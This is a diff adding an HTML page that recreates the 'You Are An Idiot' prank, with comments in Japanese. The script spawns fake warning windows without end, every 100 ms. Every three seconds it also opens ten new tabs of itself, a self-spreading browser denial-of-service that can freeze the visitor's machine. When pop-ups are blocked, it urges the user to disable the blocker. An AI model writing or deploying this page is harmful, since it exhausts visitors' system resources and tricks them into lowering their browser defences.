@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You Are An Idiot</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background-color: black;
+            position: relative;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        .warning-window {
+            position: absolute;
+            width: 300px;
+            height: 150px;
+            background-color: white;
+            border: 2px solid black;
+            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 10px;
+            animation: move 5s linear infinite;
+        }
+
+        .warning-header {
+            background-color: #0078d4;
+            color: white;
+            font-weight: bold;
+            padding: 5px;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        .warning-body {
+            flex: 1;
+            font-size: 16px;
+            color: black;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .warning-footer {
+            text-align: right;
+        }
+
+        .warning-button {
+            background-color: #e0e0e0;
+            border: 1px solid #ccc;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+
+        @keyframes move {
+            0% { transform: translate(0, 0); }
+            25% { transform: translate(50vw, -50vh); }
+            50% { transform: translate(-50vw, -50vh); }
+            75% { transform: translate(-50vw, 50vh); }
+            100% { transform: translate(0, 0); }
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // 警告ウィンドウのランダムな位置を計算する関数
+        function getRandomPosition() {
+            const x = Math.random() * (window.innerWidth - 300); // 幅300pxに基づく
+            const y = Math.random() * (window.innerHeight - 150); // 高さ150pxに基づく
+            return { x, y };
+        }
+
+        // 警告ウィンドウを作成する関数
+        function createWarningWindow() {
+            const warning = document.createElement('div');
+            warning.className = 'warning-window';
+
+            // ヘッダー部分
+            const header = document.createElement('div');
+            header.className = 'warning-header';
+            header.textContent = 'Warning';
+
+            // 本文部分
+            const body = document.createElement('div');
+            body.className = 'warning-body';
+            body.textContent = 'You Are An Idiot!';
+
+            // フッター部分 (閉じるボタン)
+            const footer = document.createElement('div');
+            footer.className = 'warning-footer';
+
+            const closeButton = document.createElement('button');
+            closeButton.className = 'warning-button';
+            closeButton.textContent = 'OK';
+            closeButton.onclick = () => warning.remove();
+
+            footer.appendChild(closeButton);
+
+            // ウィンドウを組み立て
+            warning.appendChild(header);
+            warning.appendChild(body);
+            warning.appendChild(footer);
+
+            // ランダム位置に配置
+            const { x, y } = getRandomPosition();
+            warning.style.left = `${x}px`;
+            warning.style.top = `${y}px`;
+
+            // ウィンドウを画面に追加
+            document.body.appendChild(warning);
+        }
+
+        // 初期に大量の警告ウィンドウを生成
+        for (let i = 0; i < 30; i++) {
+            createWarningWindow();
+        }
+
+        // 高速で警告ウィンドウを増やす
+        setInterval(createWarningWindow, 100); // 0.1秒ごとに追加
+
+        // タブを複製する関数
+        function cloneTab() {
+            for (let i = 0; i < 10; i++) { // 10個複製
+                const newWindow = window.open(window.location.href, '_blank');
+                if (!newWindow) {
+                    console.error("ポップアップがブロックされました。");
+                    alert("ブラウザの設定でポップアップブロックを無効にしてください。");
+                    break;
+                }
+            }
+        }
+
+        // 一定間隔でタブを複製
+        setInterval(cloneTab, 3000); // 3秒ごとにタブ複製
+    </script>
+</body>
+</html>
